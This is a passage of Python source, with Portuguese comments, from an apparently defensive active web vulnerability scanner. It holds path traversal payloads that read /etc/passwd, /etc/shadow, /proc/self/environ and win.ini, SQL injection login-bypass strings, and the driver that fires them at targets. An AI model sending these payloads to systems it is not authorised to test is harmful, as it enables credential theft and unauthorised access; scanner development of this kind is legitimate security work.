                        # Retorna após encontrar a primeira vulnerabilidade para não sobrecarregar
                        return vulnerabilities
                        
                except requests.exceptions.RequestException as e:
                    log.debug(f"Erro no teste de XSS com payload '{xss_payload[:30]}': {e}")
                    
        except Exception as e:
            log.error(f"Erro no teste de XSS para {base_request['url']}: {e}")
            
        return vulnerabilities

    def _check_path_traversal(self, base_request: Dict, point: Dict) -> List[Dict]:
        vulnerabilities = []
        if not self._is_likely_path_param(point.get('name', '')):
            return vulnerabilities

        # Payloads for Path Traversal - Expandido com múltiplas variações
        # Inclui: Linux, Windows, encoding variations, null byte injection, e diferentes profundidades
        traversal_payloads = {
            # Linux - /etc/passwd
            "../../../../../../../../etc/passwd": "root:x:0:0",
            "../../../../../../../etc/passwd": "root:x:0:0",
            "../../../../../../etc/passwd": "root:x:0:0",
            "../../../../../etc/passwd": "root:x:0:0",
            "../../../../etc/passwd": "root:x:0:0",
            "../../../etc/passwd": "root:x:0:0",
            "../../etc/passwd": "root:x:0:0",
            "../etc/passwd": "root:x:0:0",
            "/etc/passwd": "root:x:0:0",
            "etc/passwd": "root:x:0:0",
            
            # Linux - /etc/shadow (geralmente requer root)
            "../../../../../../../../etc/shadow": "root:",
            
            # Linux - /etc/hosts
            "../../../../../../../../etc/hosts": "127.0.0.1",
            
            # Linux - /proc/self/environ
            "../../../../../../../../proc/self/environ": "PATH=",
            
            # Windows - win.ini
            "../../../../../../../../windows/win.ini": "for 16-bit app support",
            "../../../../../../../windows/win.ini": "for 16-bit app support",
            "../../../../../../windows/win.ini": "for 16-bit app support",
            "../../../../../windows/win.ini": "for 16-bit app support",
            "../../../../windows/win.ini": "for 16-bit app support",
            "../../../windows/win.ini": "for 16-bit app support",
            "../../windows/win.ini": "for 16-bit app support",
            "../windows/win.ini": "for 16-bit app support",
            "windows/win.ini": "for 16-bit app support",
            "C:\\windows\\win.ini": "for 16-bit app support",
            
            # Windows - boot.ini
            "../../../../../../../../boot.ini": "[boot loader]",
            "../../../../../../../boot.ini": "[boot loader]",
            
            # Windows - System32
            "../../../../../../../../windows/system32/drivers/etc/hosts": "127.0.0.1",
            
            # Windows - Backslash variants
            "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini": "for 16-bit app support",
            "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini": "for 16-bit app support",
            "..\\..\\..\\..\\..\\..\\windows\\win.ini": "for 16-bit app support",
            "..\\..\\..\\..\\..\\windows\\win.ini": "for 16-bit app support",
            "..\\..\\..\\..\\windows\\win.ini": "for 16-bit app support",
            
            # Mixed slashes (pode funcionar em alguns sistemas)
            "..\\../..\\../..\\../..\\../etc/passwd": "root:x:0:0",
            "../\\..../\\..../\\..../\\etc/passwd": "root:x:0:0",
            
            # URL Encoded - Single encoding
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd": "root:x:0:0",
            "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd": "root:x:0:0",
            "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini": "for 16-bit app support",
            
            # URL Encoded - Double encoding
            "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd": "root:x:0:0",
            "..%255c..%255c..%255c..%255cwindows%255cwin.ini": "for 16-bit app support",
            
            # UTF-8 Encoding variations
            "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd": "root:x:0:0",
            "..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd": "root:x:0:0",
            
            # Null byte injection (pode funcionar em apps antigos PHP < 5.3)
            "../../../../../../../../etc/passwd%00": "root:x:0:0",
            "../../../../../../../../etc/passwd%00.jpg": "root:x:0:0",
            "..%2f..%2f..%2f..%2fetc%2fpasswd%00": "root:x:0:0",
            
            # Absolute paths (podem funcionar em alguns casos)
            "/etc/passwd": "root:x:0:0",
            "/windows/win.ini": "for 16-bit app support",
            "C:/windows/win.ini": "for 16-bit app support",
            
            # Relative to current project (específico para este projeto)
            "../vulnerable_server.py": "app.run(debug=True)",
            "../../vulnerable_server.py": "app.run(debug=True)",
            "../../../vulnerable_server.py": "app.run(debug=True)",
            "../start_server.bat": "@echo off",
            "../../start_server.bat": "@echo off",
            "../requirements.txt": "Flask",
            "../../requirements.txt": "Flask",
            "../config/intercept_config.json": "{",
            "../../config/intercept_config.json": "{",
            
            # Dot-dot-slash variations
            "....//....//....//....//etc/passwd": "root:x:0:0",
            "....\\\\....\\\\....\\\\....\\\\windows\\win.ini": "for 16-bit app support",
            
            # 16-bit Unicode encoding
            "..%u2216..%u2216..%u2216..%u2216etc%u2216passwd": "root:x:0:0",
            
            # Filter bypass - extra dots
            ".../.../.../.../etc/passwd": "root:x:0:0",
            "...\\...\\...\\...\\windows\\win.ini": "for 16-bit app support",
        }

        baseline_text = ""
        try:
            method = base_request.get('method')
            url = base_request.get('url')
            headers = self._sanitize_headers(base_request.get('headers', {}))
            body = base_request.get('body', '')
            data = body if not isinstance(body, str) else body.encode('utf-8')
            baseline_response = self._send_request(method, url, headers=headers, data=data, timeout=10)
            baseline_text = baseline_response.text or ""
        except Exception as e:
            log.debug(f"Falha ao obter baseline para Path Traversal em {base_request.get('url')}: {e}")

        for payload, evidence_string in traversal_payloads.items():
            try:
                if baseline_text and evidence_string in baseline_text:
                    continue
                response = self._send_modified_request(base_request, point, payload, context_tag=f"path-traversal:{payload}")
                
                if response.status_code == 200 and evidence_string in response.text:
                    vuln = {
                        'type': 'Path Traversal',
                        'severity': 'High',
                        'source': 'Active',
                        'url': base_request['url'],
                        'method': base_request['method'],
                        'description': f"Path Traversal vulnerability detected in parameter '{point['name']}'.",
                        'evidence': f"Payload '{payload}' successfully retrieved a sensitive file. Found evidence: '{evidence_string}'",
                    }
                    vulnerabilities.append(vuln)
                    log.warning(f"Path Traversal detected in {base_request['url']} at parameter {point['name']}")
                    # Return after first success for this point
                    return vulnerabilities
            except requests.exceptions.RequestException as e:
                log.error(f"Error during Path Traversal test for {base_request['url']}: {e}")
        
        return vulnerabilities

    def _check_login_sqli(self, base_request: Dict, point: Dict) -> List[Dict]:
        """Testa SQL Injection por bypass de autenticação em formulários."""
        vulnerabilities = []
        # Foco em parâmetros comuns de login
        if 'user' not in point['name'].lower() and 'pass' not in point['name'].lower():
            return vulnerabilities

        # Payloads de bypass de autenticação
        login_payloads = [
            "admin'-- ",
            "' OR '1'='1'-- ",
            "' OR 1=1-- ",
            "admin' OR '1'='1'-- ",
            "admin' OR 1=1-- ",
            "' OR 'a'='a'-- ",
            '" OR "a"="a"-- ',
        ]

        try:
            # Envia uma requisição com dados заведомо inválidos para obter uma resposta base (não deve redirecionar)
            original_response = self._send_modified_request(base_request, point, "invaliduser123456", context_tag="sqli-login:invalid")
            original_len = len(original_response.text)

            for login_payload in login_payloads:
                # Envia a requisição com o payload de bypass
                payload_response = self._send_modified_request(base_request, point, login_payload, context_tag="sqli-login:bypass")

                # Condição de sucesso 1: a resposta ao payload é um redirecionamento, e a resposta original não era.
                is_redirect = payload_response.status_code in [301, 302, 303, 307]
                was_not_redirect = original_response.status_code not in [301, 302, 303, 307]

                if is_redirect and was_not_redirect:
                    vuln = {
                        'type': 'SQL Injection (Authentication Bypass)',
                        'severity': 'Critical',
                        'source': 'Active',
                        'url': base_request['url'],
                        'method': base_request['method'],
                        'description': f"Bypass de autenticação com SQL Injection bem-sucedido no parâmetro '{point['name']}'.",
                        'evidence': f"Payload '{login_payload}' resultou em um redirecionamento (Status: {payload_response.status_code}), enquanto um usuário inválido não redirecionou (Status: {original_response.status_code}).",
                    }
                    vulnerabilities.append(vuln)
                    log.critical(f"SQL Injection de Auth Bypass detectado em {base_request['url']} no parâmetro {point['name']}")
                    return vulnerabilities

                # Condição de sucesso 2: A resposta ao payload é significativamente diferente da resposta de falha.
                payload_len = len(payload_response.text)
                len_diff = abs(original_len - payload_len)
                # Um login bem-sucedido geralmente resulta em uma página muito diferente.
                # O threshold aqui é uma heurística.
                if len_diff > original_len * 0.5 and original_response.status_code == 200 and payload_response.status_code == 200:
                    vuln = {
                        'type': 'SQL Injection (Authentication Bypass)',
                        'severity': 'Critical',
                        'source': 'Active',
                        'url': base_request['url'],
                        'method': base_request['method'],
                        'description': f"Bypass de autenticação com SQL Injection bem-sucedido no parâmetro '{point['name']}'.",
                        'evidence': f"Payload '{login_payload}' resultou em uma resposta com tamanho significativamente diferente da página de login inválido (Original: {original_len} bytes, Payload: {payload_len} bytes).",
                    }
                    vulnerabilities.append(vuln)
                    log.critical(f"SQL Injection de Auth Bypass detectado em {base_request['url']} no parâmetro {point['name']}")
                    return vulnerabilities

        except requests.exceptions.RequestException as e:
            log.error(f"Erro no teste de SQLi de login para {base_request['url']}: {e}")

        return vulnerabilities

    def scan_request(self, base_request: Dict[str, Any]) -> List[Dict[str, Any]]:
        vulnerabilities = []

        logs_dir = self._ensure_logs_dir()
        log_file_path = os.path.join(logs_dir, "active_scanner_requests.log")
        with open(log_file_path, 'a', encoding='utf-8') as f:
            f.write(f"\n\n{'='*20} New Scan Started at {datetime.now()} for {base_request.get('method')} {base_request.get('url')} {'='*20}\n")

        log.info(f"--- SCANNER DEBUG: Iniciando varredura ativa em: {base_request.get('method')} {base_request.get('url')}")
        log.info(f"--- SCANNER DEBUG: Headers recebidos: {base_request.get('headers')}")
        log.info(f"--- SCANNER DEBUG: Body recebido: {base_request.get('body')}")

        insertion_points = self._get_insertion_points(base_request)
        log.info(f"--- SCANNER DEBUG: Pontos de inserção encontrados: {insertion_points}")

        if not insertion_points and base_request.get('method', '').upper() == 'POST':
            headers = {k.lower(): v for k, v in base_request.get('headers', {}).items()}
            content_type = headers.get('content-type', 'Não especificado')
            info_vuln = {
                'type': 'Scanner Info',
                'severity': 'Low',
                'source': 'Active',
                'url': base_request['url'],
                'method': base_request['method'],
                'description': 'O scan ativo para a requisição POST falhou ao encontrar parâmetros para teste. Isso geralmente ocorre se o cabeçalho Content-Type estiver ausente ou não for \'application/x-www-form-urlencoded\'.',
                'evidence': f'Content-Type recebido pelo scanner: {content_type}',
            }
            vulnerabilities.append(info_vuln)

        for point in insertion_points:
            log.info(f"--- SCANNER DEBUG: Testando ponto de inserção: {point}")
            log.info(f"ScanAtivo - SQLi (param: {point.get('name')})")
            vulnerabilities.extend(self._check_login_sqli(base_request, point))
            vulnerabilities.extend(self._check_sql_injection(base_request, point))
            vulnerabilities.extend(self._check_boolean_sqli(base_request, point))
            vulnerabilities.extend(self._check_time_based_sqli(base_request, point))
            log.info(f"ScanAtivo - Command Injection (param: {point.get('name')})")
            vulnerabilities.extend(self._check_command_injection(base_request, point))
            log.info(f"ScanAtivo - XSS (param: {point.get('name')})")
            vulnerabilities.extend(self._check_xss(base_request, point))
            log.info(f"ScanAtivo - Path Traversal (param: {point.get('name')})")
            vulnerabilities.extend(self._check_path_traversal(base_request, point))

        module_vulnerabilities = self._run_scan_modules(base_request)
        if module_vulnerabilities:
            vulnerabilities.extend(module_vulnerabilities)

        unique_vulns = [dict(t) for t in {tuple(d.items()) for d in vulnerabilities}]
        log.info(f"--- SCANNER DEBUG: Total de vulnerabilidades únicas encontradas: {len(unique_vulns)}")

        if unique_vulns:
            log.warning(f"{len(unique_vulns)} vulnerabilidades ativas encontradas para {base_request['url']}")

        return unique_vulns
